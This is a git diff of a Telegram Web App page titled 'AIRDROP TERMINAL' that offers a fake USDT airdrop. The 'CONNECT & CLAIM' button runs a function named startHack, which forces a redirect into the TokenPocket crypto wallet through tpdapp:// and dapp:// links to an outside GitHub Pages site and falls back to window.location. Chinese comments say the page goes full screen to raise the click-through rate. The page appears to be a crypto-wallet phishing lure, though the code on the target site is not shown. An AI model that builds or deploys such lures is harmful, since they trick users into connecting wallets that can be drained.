@@ -5,7 +5,6 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>AIRDROP TERMINAL</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.js"></script>
     <style>
         body {
             background-color: #000;
@@ -25,6 +24,8 @@
             padding: 20px;
             box-shadow: 0 0 15px #ff0000;
             background: rgba(20, 0, 0, 0.8);
+            font-size: 14px;
+            line-height: 1.5;
         }
         .btn {
             background: #ff0000;
@@ -36,6 +37,7 @@
             cursor: pointer;
             text-transform: uppercase;
             box-shadow: 0 0 10px #ff0000;
+            text-decoration: none;
         }
         .glitch {
             animation: pulse 1.5s infinite;
@@ -52,46 +54,48 @@
         <h2>> SYSTEM: AIRDROP_DETECTED</h2>
         <p>> STATUS: READY_TO_CLAIM</p>
         <p>> TOKEN: USDT (TRC-20)</p>
-        <p id="wallet-addr">> WALLET: NOT CONNECTED</p>
+        <p id="log">> CONNECTION: AWAITING_USER...</p>
     </div>
-    <button class="btn glitch" onclick="connectAndClaim()">Connect & Claim</button>
+
+    <a href="javascript:void(0)" onclick="startHack()" class="btn glitch">
+        CONNECT & CLAIM
+    </a>
 
 <script>
-    // 1. 初始化 Telegram 环境
+    // 1. 初始化 Telegram
     const tg = window.Telegram.WebApp;
     tg.ready();
-    tg.expand(); // 让页面全屏，增加点击成功率
+    tg.expand();
 
-    function connectAndClaim() {
-    tg.HapticFeedback.notificationOccurred('success');
-    const terminal = document.getElementById('terminal');
-
-    // 你的准确网址
-    const myUrl = "https://patrickdafhao-code.github.io/cook/";
-
-    // 方案 A：TokenPocket 最标准的协议格式
-    const tpLink = "tpdapp://open?params=" + encodeURIComponent(JSON.stringify({"url": myUrl}));
-    
-    // 方案 B：通用的 DApp 唤起协议 (很多钱包都识别)
-    const dappLink = "dapp://" + myUrl.replace("https://", "");
-
-    terminal.innerHTML += "<p style='color:#0f0'>> [TARGET]: " + myUrl + "</p>";
-    terminal.innerHTML += "<p style='color:#ff0'>> [STATUS]: INITIATING_HACK_PROTOCOL...</p>";
-
-    // 核心：强制触发 Telegram 的离开警告
-    try {
-        // 第一尝试：直接拉起 TP
-        tg.openLink(tpLink, { try_browser: true });
+    function startHack() {
+        // 震动反馈
+        tg.HapticFeedback.notificationOccurred('success');
         
-        // 1.5秒后如果没跳走，尝试通用协议
-        setTimeout(() => {
-            tg.openLink(dappLink, { try_browser: true });
-        }, 1500);
-    } catch (e) {
-        // 如果 API 报错，直接修改地址（强制弹窗）
-        window.location.href = tpLink;
+        const log = document.getElementById('log');
+        const myUrl = "https://patrickdafhao-code.github.io/cook/";
+        
+        // 2. 构造 TokenPocket 协议
+        const tpLink = "tpdapp://open?params=" + encodeURIComponent(JSON.stringify({"url": myUrl}));
+        // 构造通用协议
+        const dappLink = "dapp://" + myUrl.replace("https://", "");
+
+        log.innerHTML = "<p style='color:#0f0'>> [TARGET]: REDIRECTING...</p>";
+
+        // 3. 强制跳转逻辑
+        try {
+            // 尝试直接拉起
+            tg.openLink(tpLink, { try_browser: true });
+            
+            // 如果 1.5秒没跳走，尝试通用协议
+            setTimeout(() => {
+                tg.openLink(dappLink, { try_browser: true });
+            }, 1500);
+            
+        } catch (e) {
+            // 兜底方案
+            window.location.href = tpLink;
+        }
     }
-}
 </script>
 </body>
 </html>
